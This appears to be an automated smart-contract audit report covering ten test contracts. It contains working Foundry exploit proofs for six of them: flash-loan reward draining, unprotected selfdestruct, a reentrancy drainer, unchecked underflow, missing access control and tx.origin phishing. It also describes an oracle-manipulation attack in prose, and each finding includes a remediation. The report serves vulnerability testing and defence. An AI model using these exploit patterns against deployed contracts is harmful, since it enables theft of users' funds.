# Culpa audit — sleuth on `committed`

Model: `gemini-3.5-flash-lite` · 10 contract(s) · 7 finding(s), 6 proven with a landed exploit

## Summary

| Contract | Verdict | Findings |
|---|---|---|
| FlashFarm | vulnerable | logic-error (high, PROVEN) |
| GlassJaw | vulnerable | unprotected-selfdestruct (high, PROVEN) |
| HallOfMirrors | vulnerable | price-oracle-manipulation (high) |
| HollowVault | vulnerable | reentrancy (high, PROVEN) |
| Irongate | no findings | — |
| LatchGate | no findings | — |
| LooseLedger | vulnerable | arithmetic (high, PROVEN) |
| OpenTill | vulnerable | access-control (high, PROVEN) |
| OriginGate | vulnerable | tx-origin-auth (high, PROVEN) |
| TrueVault | no findings | — |

## FlashFarm — logic-error (🔴 high) · ✅ PROVEN

The staking contract lacks time-weighted reward distribution, allowing an attacker to use a flash loan to capture the entire pool's rewards in a single atomic transaction. By staking, claiming, and unstaking instantly, the attacker drains all available yield intended for long-term stakers.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `1000000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ExploitProof} from "@proof/ExploitProof.sol";
import {FlashFarm, Token} from "@contracts/FlashFarm.sol";

contract ProveFlashFarmFlashFarmInstantDrain is ExploitProof {
    function test_exploit() external {
        Token stakeToken = new Token();
        Token rewardToken = new Token();
        FlashFarm farm = new FlashFarm(stakeToken, rewardToken);

        address attacker = makeAddr("attacker");
        
        // Fund the reward pool with 1000 tokens
        rewardToken.mint(address(this), 1000 ether);
        rewardToken.approve(address(farm), 1000 ether);
        farm.fund(1000 ether);

        // Attacker gets stake tokens
        stakeToken.mint(attacker, 10000 ether);

        vm.startPrank(attacker);
        stakeToken.approve(address(farm), 10000 ether);
        farm.stake(10000 ether);
        farm.claim();
        farm.unstake(10000 ether);
        vm.stopPrank();

        profit = rewardToken.balanceOf(attacker);
        assertExploitLanded(500 ether);
    }
}
```

**Remediation.** Re-examine the invariant the function should preserve and add property tests around it.

---

## GlassJaw — unprotected-selfdestruct (🔴 high) · ✅ PROVEN

The `demolish` function lacks access control, allowing any caller to invoke it directly. The attacker calls `demolish(attackerAddress)`, which triggers `selfdestruct` and drains the contract's entire ETH balance.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {GlassJaw} from "@contracts/GlassJaw.sol";

contract ProveGlassJawLeadUnprotectedSelfdestruct is ExploitProof {
    function test_exploit() external {
        GlassJaw v = new GlassJaw();
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice); 
        v.deposit{value: 10 ether}();

        address payable attacker = payable(makeAddr("attacker"));
        vm.prank(attacker);
        v.demolish(attacker);

        profit = attacker.balance;
        assertExploitLanded(5 ether);
    }
}
```

**Remediation.** Guard `selfdestruct` behind an owner check, or remove it.

---

## HallOfMirrors — price-oracle-manipulation (🔴 high) · unconfirmed

An attacker implements a flash loan callback (`onFlashLoan`) that first uses the borrowed cash to inflate the spot price of stake in the `MirrorPool` via `swapCashForStake`. Next, the attacker pledges a tiny amount of stake to the `PawnShop`, calls `draw` to borrow a massive amount of cash against the artificially inflated collateral value, repays the flash loan, and walks away with the drained cash.

**Remediation.** Do not use an AMM spot price as an oracle. Use a TWAP, a dedicated price feed, or a manipulation-resistant source, and sanity-check against a second source.

---

## HollowVault — reentrancy (🔴 high) · ✅ PROVEN

The vault violates checks-effects-interactions by transferring ETH before clearing the user's balance. An attacker's fallback function re-enters `withdraw()` repeatedly to drain the entire vault balance in a single transaction.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {HollowVault} from "@contracts/HollowVault.sol";

contract Raider {
    HollowVault v;
    constructor(HollowVault _v) payable { v = _v; }
    function go() external { v.deposit{value: 1 ether}(); v.withdraw(); }
    receive() external payable {
        if (address(v).balance >= 1 ether) {
            v.withdraw();
        }
    }
}

contract ProveHollowVaultLeadOne is ExploitProof {
    function test_exploit() external {
        HollowVault v = new HollowVault();
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice); v.deposit{value: 10 ether}();

        Raider raider = new Raider{value: 1 ether}(v);
        raider.go();

        profit = address(raider).balance - 1 ether;
        assertExploitLanded(5 ether);
    }
}
```

**Remediation.** Apply checks-effects-interactions — update state before the external call — or wrap the function in a reentrancy guard.

---

## LooseLedger — arithmetic (🔴 high) · ✅ PROVEN

An unchecked subtraction in spend() allows callers to underflow their points balance to type(uint256).max by passing an amount exceeding their balance. This bypasses solvency checks and drains contract ETH via subsequent low-level transfers.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `5000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {LooseLedger} from "@contracts/LooseLedger.sol";

contract ProveLooseLedgerLeadOne is ExploitProof {
    function test_exploit() external {
        LooseLedger ledger = new LooseLedger();
        
        address payable attacker = payable(makeAddr("attacker"));
        
        // Fund the contract so there is ETH to drain
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        ledger.topUp{value: 10 ether}();

        // Attacker spends more than they have (0 points), underflowing to max uint256
        vm.prank(attacker);
        ledger.spend(5 ether);

        profit = attacker.balance;
        assertExploitLanded(1 ether);
    }
}
```

**Remediation.** Remove the `unchecked` block or add explicit bounds checks; on Solidity <0.8 use SafeMath.

---

## OpenTill — access-control (🔴 high) · ✅ PROVEN

OpenTill.drain lacks access control modifiers, allowing any external caller to pass their address as a parameter. An attacker invokes this function directly to transfer the contract's entire ETH balance to themselves.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {OpenTill} from "@contracts/OpenTill.sol";

contract ProveOpenTillLeadOne is ExploitProof {
    function test_exploit() external {
        OpenTill till = new OpenTill();
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice); 
        till.deposit{value: 10 ether}();

        address payable attacker = payable(makeAddr("attacker"));
        vm.prank(attacker);
        till.drain(attacker);

        profit = attacker.balance;
        assertExploitLanded(5 ether);
    }
}
```

**Remediation.** Restrict the function to an authorized role. A function that moves funds must never be callable by an arbitrary address.

---

## OriginGate — tx-origin-auth (🔴 high) · ✅ PROVEN

Using `tx.origin` for authorization allows attackers to drain contracts by tricking the owner into executing a transaction that invokes a malicious intermediary. Because `tx.origin` evaluates to the initiating EOA regardless of intermediate calls, the malicious contract successfully impersonates the owner to steal all ETH.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {OriginGate} from "@contracts/OriginGate.sol";

contract Attacker {
    OriginGate gate;
    constructor(OriginGate _gate) { gate = _gate; }
    function attack(address payable beneficiary) external {
        gate.withdraw(beneficiary, address(gate).balance);
    }
}

contract ProveOriginGateLeadOne is ExploitProof {
    function test_exploit() external {
        address owner = makeAddr("owner");
        vm.deal(owner, 10 ether);

        vm.prank(owner);
        OriginGate gate = new OriginGate{value: 10 ether}();

        address payable attacker = payable(makeAddr("attacker"));
        Attacker atk = new Attacker(gate);

        // Trick the owner (tx.origin) into calling the malicious contract
        vm.prank(owner, owner);
        atk.attack(attacker);

        profit = attacker.balance;
        assertExploitLanded(5 ether);
    }
}
```

**Remediation.** Authenticate with `msg.sender`, never `tx.origin` — `tx.origin` lets a phished user's call be relayed by an attacker contract.

---
